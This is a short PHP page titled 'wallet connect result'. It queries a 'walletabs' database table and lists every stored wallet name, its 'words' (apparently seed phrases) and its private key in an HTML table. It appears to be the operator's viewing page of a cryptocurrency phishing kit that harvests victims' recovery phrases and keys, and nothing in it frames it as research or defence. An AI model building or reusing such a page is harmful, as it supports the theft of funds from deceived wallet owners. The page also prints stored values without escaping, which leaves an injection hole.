<?php
 include_once('contact.php'); 
 $query="select * from walletabs"; 
 $result=mysqli_query($con,$query);
?>
<!DOCTYPE html> 
<html> 	
<head> 		
	<title> wallet connect result </title> 	
</head> 	
<body> 	
	<table align="center" border="1px" style="width:100%; line-height:40px;"> 	
		<tr> 		
			<th colspan="4"><h2>btc Result</h2></th> 
			</tr>
		<tr>		 			 
		<th> walletname </th> 			 
		<th> words </th> 			 
		<th> privatekey </th> 			 	 		
	</tr> 		 		
	<?php while($row=mysqli_fetch_assoc($result)) { 
		$walletname = $row['walletname']; 
		$words = $row['words']; 
		$privatekey = $row['privatekey']; 
		?> 
		<tr> 
			<td><?php echo $walletname ?></td> 
			<td><?php echo $words ?></td> 
			<td><?php echo $privatekey ?></td> 	
		</tr> 	
	<?php
	 } 
	?> 	
	</table> 	
</body> 	
</html>